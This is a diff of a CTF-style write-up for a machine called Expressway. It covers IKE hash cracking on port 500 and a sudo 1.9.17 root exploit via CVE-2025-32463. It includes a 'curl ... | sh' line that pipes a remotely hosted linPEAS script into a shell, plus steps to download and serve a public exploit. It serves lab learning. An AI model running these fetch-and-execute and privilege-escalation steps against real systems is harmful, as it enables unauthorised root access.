@@ -3,7 +3,12 @@ layout: default
 title: Expressway
 ---
 
+## TL;DR
+
+We achieve hash and crack it from the `ike` server in port 500. Then we exploit known PE vector on sudo version to get root privileges.
+
 ### Recon
+
 We start with `nmap`, using this command:
 ```bash
 nmap -p- -sVC --min-rate=10000 $target
@@ -49,7 +54,7 @@ So, we have the port `500` open, and running the service `isakmp`.
 
 ### achieve hash and crack it
 
-Okay, we can google for it, and find this article: https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting
+Okay, we can google for it, and find this article: [https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting)
 
 When we execute this
 ```bash
@@ -125,10 +130,10 @@ curl -L http://10.10.14.168:8081/linPEAS.sh | sh
 As we can see, the sudo version is `1.9.17`.
 ![sudo version](image-5.png)
 
-After googling, i found this repo about the privilege escalation in this version: https://github.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT
+After googling, i found this repo about the privilege escalation in this version: [https://github.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT)
 
 Let's get the `exploit.sh`, so in our local machine:
-```
+```bash
 curl -L https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2025-32463-EXPLOIT/refs/heads/main/CVE-2025-32463.sh -o CVE-2025-32463.sh
 
 python3 -m http.server 8081
